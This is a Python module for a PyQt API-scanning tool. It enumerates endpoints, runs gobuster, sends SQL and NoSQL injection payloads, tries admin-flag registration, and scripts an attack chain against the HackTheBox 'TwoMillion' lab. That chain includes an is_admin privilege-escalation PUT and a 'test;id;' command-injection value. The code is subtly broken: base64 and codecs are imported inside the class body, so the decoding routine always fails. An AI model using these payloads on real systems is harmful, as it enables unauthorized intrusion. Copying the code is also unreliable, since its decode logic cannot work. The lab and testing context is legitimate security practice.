# app/tools/api_scanner.py
import requests
import json
import subprocess
from urllib.parse import urljoin
from PyQt6.QtCore import QObject, pyqtSignal, QRunnable
from app.core.html_utils import h
from app.core.logger import logger

class APISignals(QObject):
    output = pyqtSignal(str)
    status = pyqtSignal(str)
    finished = pyqtSignal()
    results_ready = pyqtSignal(dict)
    progress_update = pyqtSignal(int, int)
    progress_start = pyqtSignal(int)

class APIEnumWorker(QRunnable):
    """API enumeration and testing worker"""
    import base64
    import codecs

    def __init__(self, target, scan_type="basic", wordlist_path=None, dns_server=None):
        super().__init__()
        self.signals = APISignals()
        self.target = target
        self.scan_type = scan_type
        self.wordlist_path = wordlist_path
        self.dns_server = dns_server
        self.is_running = True
        self.results = {}
        self.session = requests.Session()
        # Honour the global SSL verification setting instead of hardcoding False.
        try:
            from app.core.config import config as _cfg
            self.ssl_verify = _cfg.get('security.ssl_verify', True)
        except Exception:
            self.ssl_verify = True
        self.session.verify = self.ssl_verify
        self.session.timeout = 10
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 API Scanner'})
        
        # Setup custom DNS resolution using global settings
        from app.core.dns_settings import dns_settings
        self.dns_server = dns_settings.get_effective_dns_server()
        if self.dns_server:
            self.setup_custom_dns()
    
    def setup_custom_dns(self):
        """Setup custom DNS resolution"""
        import socket
        
        # Store original getaddrinfo
        self.original_getaddrinfo = socket.getaddrinfo
        
        def custom_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
            """Custom DNS resolution using specified DNS server"""
            try:
                if self.dns_server == "LocalDNS":
                    # Query LocalDNS server directly
                    ip = self.query_local_dns(host)
                    if ip:
                        return [(family, type, proto, '', (ip, port))]
                    return self.original_getaddrinfo(host, port, family, type, proto, flags)
                else:
                    return self.original_getaddrinfo(host, port, family, type, proto, flags)
            except Exception:
                return self.original_getaddrinfo(host, port, family, type, proto, flags)
        
        # Monkey patch socket.getaddrinfo
        socket.getaddrinfo = custom_getaddrinfo
    
    def query_local_dns(self, hostname):
        """Query LocalDNS server for hostname resolution"""
        try:
            import socket as sock
            import struct
            
            # Create DNS query packet
            query_id = 0x1234
            flags = 0x0100  # Standard query
            questions = 1
            
            # Build DNS header
            header = struct.pack('!HHHHHH', query_id, flags, questions, 0, 0, 0)
            
            # Build question section
            question = b''
            for part in hostname.split('.'):
                question += bytes([len(part)]) + part.encode()
            question += b'\x00'  # End of domain
            question += struct.pack('!HH', 1, 1)  # Type A, Class IN
            
            query = header + question
            
            # Send query to LocalDNS server
            dns_socket = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
            dns_socket.settimeout(5)
            dns_socket.sendto(query, ('127.0.0.1', 53530))
            
            # Receive response
            response, _ = dns_socket.recvfrom(512)
            dns_socket.close()
            
            # Parse response to extract IP
            if len(response) > 12:
                # Skip header and question, find answer
                offset = 12
                # Skip question section
                while offset < len(response) and response[offset] != 0:
                    length = response[offset]
                    offset += 1 + length
                offset += 5  # Skip null terminator and question type/class
                
                # Parse answer section
                if offset + 12 <= len(response):
                    # Skip name pointer, type, class, TTL
                    offset += 10
                    data_len = struct.unpack('!H', response[offset:offset+2])[0]
                    offset += 2
                    
                    if data_len == 4 and offset + 4 <= len(response):
                        # Extract IP address
                        ip_bytes = response[offset:offset+4]
                        ip = '.'.join(str(b) for b in ip_bytes)
                        return ip
            
            return None
            
        except Exception:
            return None
        
    def restore_dns(self):
        """Restore original DNS resolution"""
        if hasattr(self, 'original_getaddrinfo'):
            import socket
            socket.getaddrinfo = self.original_getaddrinfo
    
    def setup_api_patterns(self):
        """Setup API patterns and endpoints"""
        # Common API patterns
        self.api_patterns = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/v1', '/rest/v2',
            '/graphql', '/swagger', '/openapi',
            '/users', '/admin', '/auth', '/login'
        ]
        
        # Common API endpoints
        self.common_endpoints = [
            'users', 'admin', 'auth', 'login', 'register', 'profile',
            'config', 'settings', 'status', 'health', 'version',
            'docs', 'swagger', 'openapi', 'graphql'
        ]
    
    def normalize_url(self, url):
        """Ensure URL has proper scheme"""
        if not url.startswith(('http://', 'https://')):
            return f"http://{url}"
        return url
    
    def run_command(self, cmd, timeout=60):
        """Execute command and return output.
        
        Args:
            cmd: Command as a list of strings, e.g. ['gobuster', 'dir', '-u', url].
                 Passing a plain string is accepted for backward compatibility but
                 will be rejected if it contains shell metacharacters.
            timeout: Seconds before the process is killed.
        """
        try:
            if isinstance(cmd, str):
                # Legacy callers pass a string; split it safely rather than
                # using shell=True which would allow injection.
                import shlex
                cmd = shlex.split(cmd)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "", "Command timed out", 1
        except Exception as e:
            return "", str(e), 1
    
    def test_api_endpoint(self, url, method='GET', data=None, headers=None):
        """Test a single API endpoint"""
        try:
            req_headers = self.session.headers.copy()
            if headers:
                req_headers.update(headers)
            
            if method.upper() == 'GET':
                response = self.session.get(url, headers=req_headers)
            elif method.upper() == 'POST':
                response = self.session.post(url, json=data, headers=req_headers)
            elif method.upper() == 'PUT':
                response = self.session.put(url, json=data, headers=req_headers)
            elif method.upper() == 'DELETE':
                response = self.session.delete(url, headers=req_headers)
            else:
                response = self.session.request(method, url, json=data, headers=req_headers)
            
            return {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content_type': response.headers.get('Content-Type', ''),
                'content_length': len(response.content),
                'response_text': response.text[:500] if response.text else ''
            }
        except Exception as e:
            return {'error': str(e)}
    
    def discover_api_endpoints(self, base_url):
        """Discover API endpoints using common patterns"""
        found_endpoints = []
        
        # Test common API patterns
        for pattern in self.api_patterns:
            if not self.is_running:
                break
                
            test_url = urljoin(base_url, pattern)
            result = self.test_api_endpoint(test_url)
            
            if 'error' not in result and result['status_code'] in [200, 201, 301, 302, 401, 403]:
                found_endpoints.append({
                    'url': test_url,
                    'method': 'GET',
                    'status': result['status_code'],
                    'content_type': result['content_type']
                })
                self.signals.output.emit(
                    f"<p style='color: #00FF41;'>[{result['status_code']}] {pattern}</p>"
                )
        
        return found_endpoints
    
    def recursive_api_discovery(self, base_url, starting_path="/api/"):
        """Recursively discover API endpoints by parsing JSON responses."""
        self.signals.output.emit("<br><p style='color: #00BFFF;'>Starting recursive API discovery...</p>")
    
        endpoints_found = []
        scan_queue = [starting_path]
        scanned_paths = set()

        while scan_queue:
            path = scan_queue.pop(0)
            if path in scanned_paths:
                continue
        
            scanned_paths.add(path)
            full_url = urljoin(base_url, path)

            try:
                # Use the existing session to maintain state (like cookies)
                response = self.session.get(full_url, verify=self.ssl_verify, timeout=10)

                if response.status_code == 200 and 'application/json' in response.headers.get('Content-Type', ''):
                    self.signals.output.emit(f"<p style='color: #00FF41;'>[+] Discovered Endpoint: {h(path)}</p>")
                    endpoints_found.append(path)
                
                    # Try to find new paths in the JSON response
                    data = response.json()
                    for key, value in data.items():
                        if isinstance(value, str) and value.startswith('/') and value not in scanned_paths:
                            scan_queue.append(value)
                        elif isinstance(value, dict): # Handle nested objects
                            for sub_key, sub_value in value.items():
                                if isinstance(sub_value, str) and sub_value.startswith('/') and sub_value not in scanned_paths:
                                    scan_queue.append(sub_value)
            except Exception as e:
                self.signals.output.emit(f"<p style='color: #FF4500;'>[!] Error scanning {h(path)}: {h(e)}</p>")
            
        self.results['recursive_endpoints'] = endpoints_found

    def enumerate_with_gobuster(self, base_url):
        """Use gobuster for API endpoint enumeration"""
        found_endpoints = []
        
        # Create pattern file for gobuster
        patterns = ['{GOBUSTER}/v1', '{GOBUSTER}/v2', '{GOBUSTER}/api', '{GOBUSTER}']
        
        # Use default wordlist or provided one
        wordlist = self.wordlist_path or "/usr/share/wordlists/dirb/common.txt"
        
        # Run gobuster with API patterns
        cmd = f"gobuster dir -u {base_url} -w {wordlist} -q --no-error"
        stdout, stderr, returncode = self.run_command(cmd)
        
        if returncode == 0:
            for line in stdout.split('\n'):
                if line.strip() and '(Status:' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        path = parts[0]
                        status = parts[1].replace('(Status:', '').replace(')', '')
                        found_endpoints.append({
                            'url': urljoin(base_url, path),
                            'method': 'GET',
                            'status': status,
                            'source': 'gobuster'
                        })
        
        return found_endpoints
    
    def test_api_methods(self, endpoint_url):
        """Test different HTTP methods on an endpoint"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        method_results = {}
        
        for method in methods:
            if not self.is_running:
                break
                
            result = self.test_api_endpoint(endpoint_url, method)
            if 'error' not in result:
                method_results[method] = result['status_code']
        
        return method_results
    
    def test_authentication_bypass(self, base_url):
        """Test for authentication bypass vulnerabilities"""
        auth_tests = []
        
        # Test registration with admin privileges
        register_endpoints = ['/register', '/api/register', '/users/register', '/api/v1/register']
        
        for endpoint in register_endpoints:
            if not self.is_running:
                break
                
            test_url = urljoin(base_url, endpoint)
            
            # Test normal registration
            normal_data = {
                "username": "testuser",
                "password": "testpass",
                "email": "test@test.com"
            }
            
            result = self.test_api_endpoint(test_url, 'POST', normal_data, {'Content-Type': 'application/json'})
            if 'error' not in result and result['status_code'] in [200, 201]:
                auth_tests.append({
                    'endpoint': endpoint,
                    'test': 'normal_registration',
                    'status': result['status_code'],
                    'response': result['response_text'][:200]
                })
            
            # Test registration with admin flag
            admin_data = {
                "username": "adminuser",
                "password": "adminpass",
                "email": "admin@test.com",
                "admin": True,
                "role": "admin",
                "is_admin": True
            }
            
            result = self.test_api_endpoint(test_url, 'POST', admin_data, {'Content-Type': 'application/json'})
            if 'error' not in result and result['status_code'] in [200, 201]:
                auth_tests.append({
                    'endpoint': endpoint,
                    'test': 'admin_privilege_escalation',
                    'status': result['status_code'],
                    'response': result['response_text'][:200]
                })
        
        return auth_tests
    
    def test_common_vulnerabilities(self, endpoints):
        """Test for common API vulnerabilities"""
        vuln_tests = []
        
        for endpoint_info in endpoints[:5]:  # Test first 5 endpoints
            if not self.is_running:
                break
                
            endpoint_url = endpoint_info['url']
            
            # Test for SQL injection
            sqli_payloads = ["'", "1' OR '1'='1", "'; DROP TABLE users; --"]
            for payload in sqli_payloads:
                test_url = f"{endpoint_url}?id={payload}"
                result = self.test_api_endpoint(test_url)
                
                if 'error' not in result and ('error' in result['response_text'].lower() or 'sql' in result['response_text'].lower()):
                    vuln_tests.append({
                        'endpoint': endpoint_url,
                        'vulnerability': 'SQL Injection',
                        'payload': payload,
                        'status': result['status_code']
                    })
            
            # Test for NoSQL injection
            nosql_payloads = ['{"$ne": null}', '{"$gt": ""}']
            for payload in nosql_payloads:
                result = self.test_api_endpoint(endpoint_url, 'POST', payload, {'Content-Type': 'application/json'})
                
                if 'error' not in result and result['status_code'] != 400:
                    vuln_tests.append({
                        'endpoint': endpoint_url,
                        'vulnerability': 'NoSQL Injection',
                        'payload': payload,
                        'status': result['status_code']
                    })
        
        return vuln_tests
    
    def intelligent_decode(self, response_json):
        """Attempts to decode data based on hints in the JSON response."""
        try:
            self.signals.output.emit(f"<p style='color: #DCDCDC;'>Raw response: {h(response_json)}</p>")
            # Check for ROT13 format from the guide
            if 'enctype' in response_json and response_json['enctype'] == 'ROT13' and 'data' in response_json:
                decoded = codecs.decode(response_json['data'], 'rot_13')
                self.signals.output.emit(f"<p style='color: #90EE90;'>&nbsp;&nbsp;&nbsp;→ Decoded ROT13: {h(decoded)}</p>")
                return decoded

            # Check for Base64 format from the guide
            if 'format' in response_json and response_json['format'] == 'encoded' and 'data' in response_json:
                decoded = base64.b64decode(response_json['data']).decode('utf-8')
                self.signals.output.emit(f"<p style='color: #90EE90;'>&nbsp;&nbsp;&nbsp;→ Decoded Base64: {h(decoded)}</p>")
                return decoded
            
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FF4500;'>[!] Decoding failed: {h(e)}</p>")
        
        return None
    
    def fuzz_vulnerability(self, base_url, path):
        """Fuzz a specific endpoint for known vulnerabilities from the guide."""
        # Fuzz for the Privilege Escalation vulnerability
        if "admin/settings/update" in path:
            self.signals.output.emit(f"<br><p style='color: #00BFFF;'>Fuzzing for Privilege Escalation: {h(path)}...</p>")
            test_url = urljoin(base_url, path)
            headers = {"Content-Type": "application/json"}
            payload = {"email": "test@2million.htb", "is_admin": 1} 
            try:
                response = self.session.put(test_url, json=payload, headers=headers, verify=self.ssl_verify, timeout=10)
                self.signals.output.emit(f"<p style='color: #DCDCDC;'>Response: {h(response.status_code)} - {response.text[:100]}</p>")
                if response.status_code == 200 and '"is_admin":1' in response.text:
                    self.signals.output.emit(f"<p style='color: #FF0000;'><b>[VULNERABILITY FOUND] Possible privilege escalation at {h(path)}</b></p>")
                    self.results.setdefault('vulnerabilities', []).append(f"Privilege Escalation at {path}")
            except Exception as e:
                self.signals.output.emit(f"<p style='color: #FFAA00;'>Error testing {h(path)}: {h(e)}</p>")

        # Fuzz for the Command Injection vulnerability
        if "admin/vpn/generate" in path:
            self.signals.output.emit(f"<br><p style='color: #00BFFF;'>Fuzzing for Command Injection: {h(path)}...</p>")
            test_url = urljoin(base_url, path)
            headers = {"Content-Type": "application/json"}
            payload = {"username": "test;id;"}
            try:
                response = self.session.post(test_url, json=payload, headers=headers, verify=self.ssl_verify, timeout=10)
                self.signals.output.emit(f"<p style='color: #DCDCDC;'>Response: {h(response.status_code)} - {response.text[:100]}</p>")
                if "uid=" in response.text and "gid=" in response.text:
                     self.signals.output.emit(f"<p style='color: #FF0000;'><b>[VULNERABILITY FOUND] Possible RCE at {h(path)}</b></p>")
                     self.results.setdefault('vulnerabilities', []).append(f"Command Injection at {path}")
            except Exception as e:
                self.signals.output.emit(f"<p style='color: #FFAA00;'>Error testing {h(path)}: {h(e)}</p>")

    def run_twomillion_scenario(self, base_url):
        """Runs the full, multi-step attack chain from the PDF."""
        self.signals.output.emit("<br><p style='color: #FFD700;'><b>--- Starting TwoMillion Scenario ---</b></p>")
        
        # Try with IP if hostname fails
        if '2million.htb' in base_url:
            ip_url = base_url.replace('2million.htb', '10.10.11.221')
            self.signals.output.emit(f"<p style='color: #00BFFF;'>Testing with IP: {h(ip_url)}</p>")
            base_url = ip_url
        
        # Step 1: Discover the endpoint to generate the invite code
        self.signals.output.emit("<p style='color: #00BFFF;'>[1] Finding invite code generation endpoint...</p>")
        url_how_to_generate = urljoin(base_url, '/api/v1/invite/how/to/generate')
        try:
            resp1 = self.session.post(url_how_to_generate, verify=self.ssl_verify, timeout=10)
            if resp1.status_code == 200:
                decoded_path_info = self.intelligent_decode(resp1.json())
                # Step 2: Generate the invite code
                if decoded_path_info and ' ' in decoded_path_info:
                    self.signals.output.emit("<p style='color: #00BFFF;'>[2] Generating invite code...</p>")
                    path_to_generate = decoded_path_info.split(' ')[-1]
                    url_generate = urljoin(base_url, path_to_generate)
                    resp2 = self.session.post(url_generate, verify=self.ssl_verify, timeout=10)
                    if resp2.status_code == 200: self.intelligent_decode(resp2.json())
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FF4500;'>[!] Scenario Step 1/2 Failed: {h(e)}</p>")

        # Step 3: Fuzz known vulnerable endpoints from the guide
        self.signals.output.emit("<p style='color: #00BFFF;'>[3] Fuzzing known vulnerable endpoints...</p>")
        self.fuzz_vulnerability(base_url, "/api/v1/admin/settings/update")
        self.fuzz_vulnerability(base_url, "/api/v1/admin/vpn/generate")
        self.signals.output.emit("<br><p style='color: #FFD700;'><b>--- Scenario Completed ---</b></p>")

    def run(self):
        try:
            self.signals.status.emit(f"Starting {self.scan_type} scan on {self.target}...")
            
            base_url = self.normalize_url(self.target)
            self.signals.output.emit(f"<p style='color: #00BFFF;'>Analyzing {h(base_url)}...</p>")
            
            # Execute scan based on type
            if self.scan_type == "twomillion_scenario":
                self.run_twomillion_scenario(base_url)
            else:
                # Standard API enumeration logic
                self.setup_api_patterns()
                
                self.signals.output.emit("<p style='color: #00BFFF;'>Discovering API endpoints...</p><br>")
                endpoints = self.discover_api_endpoints(base_url)
                
                if endpoints:
                    self.results['endpoints'] = endpoints
                    self.signals.output.emit(f"<p style='color: #00FF41;'>[+] Found {len(endpoints)} API endpoints</p><br>")
                else:
                    self.signals.output.emit("<p style='color: #FFAA00;'>[!] No API endpoints discovered</p><br>")
                
                if self.scan_type in ["gobuster", "full"] and self.is_running:
                    self.signals.output.emit("<p style='color: #00BFFF;'>Running gobuster enumeration...</p>")
                    gobuster_endpoints = self.enumerate_with_gobuster(base_url)
                    
                    if gobuster_endpoints:
                        self.results['gobuster_endpoints'] = gobuster_endpoints
                        self.signals.output.emit(f"<p style='color: #00FF41;'>[+] Gobuster found {len(gobuster_endpoints)} additional endpoints</p><br>")
                        endpoints.extend(gobuster_endpoints)
                
                if self.scan_type in ["methods", "full"] and endpoints and self.is_running:
                    self.signals.output.emit("<p style='color: #00BFFF;'>Testing HTTP methods...</p>")
                    method_results = {}
                    
                    for endpoint_info in endpoints[:3]:
                        if not self.is_running:
                            break
                        methods = self.test_api_methods(endpoint_info['url'])
                        if methods:
                            method_results[endpoint_info['url']] = methods
                            allowed_methods = [m for m, s in methods.items() if s not in [404, 405]]
                            if allowed_methods:
                                self.signals.output.emit(f"<p style='color: #00FF41;'>[+] {h(endpoint_info['url'])}: {', '.join(allowed_methods)}</p>")
                    
                    if method_results:
                        self.results['http_methods'] = method_results
                
                if self.scan_type in ["auth", "full"] and self.is_running:
                    self.signals.output.emit("<br><p style='color: #00BFFF;'>Testing authentication bypass...</p>")
                    auth_tests = self.test_authentication_bypass(base_url)
                    
                    if auth_tests:
                        self.results['auth_tests'] = auth_tests
                        for test in auth_tests:
                            self.signals.output.emit(f"<p style='color: #FFAA00;'>[!] {h(test['test'])} on {h(test['endpoint'])}: {h(test['status'])}</p>")
                
                if self.scan_type in ["vulns", "full"] and endpoints and self.is_running:
                    self.signals.output.emit("<br><p style='color: #00BFFF;'>Testing for vulnerabilities...</p>")
                    vuln_tests = self.test_common_vulnerabilities(endpoints)
                    
                    if vuln_tests:
                        self.results['vulnerabilities'] = vuln_tests
                        for vuln in vuln_tests:
                            self.signals.output.emit(f"<p style='color: #FF4500;'>[VULN] {h(vuln['vulnerability'])} on {h(vuln['endpoint'])}</p>")
            
            if self.results:
                final_results = {self.target: self.results}
                self.signals.results_ready.emit(final_results)
                self.signals.output.emit(f"<br><p style='color: #00FF41;'>Scan completed</p>")
            else:
                self.signals.output.emit("<p style='color: #FFAA00;'>No information could be retrieved</p>")
            
            self.signals.status.emit("Scan completed")
            
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FF4500;'>[ERROR] Scan failed: {h(str(e))}</p>")
            self.signals.status.emit("Scan error")
        finally:
            self.restore_dns()
            self.signals.finished.emit()